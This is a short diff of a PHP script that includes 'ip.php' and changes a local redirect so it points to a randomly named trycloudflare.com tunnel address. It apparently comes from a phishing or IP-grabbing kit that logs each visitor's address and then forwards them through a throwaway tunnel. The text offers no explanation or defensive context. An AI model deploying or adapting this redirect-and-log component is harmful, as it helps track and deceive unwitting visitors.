@@ -1,5 +1,5 @@
 <?php
 include 'ip.php';
-header('Location: /index.html');
+header('Location: https://charged-irrigation-receives-districts.trycloudflare.com/index.html');
 exit
 ?>
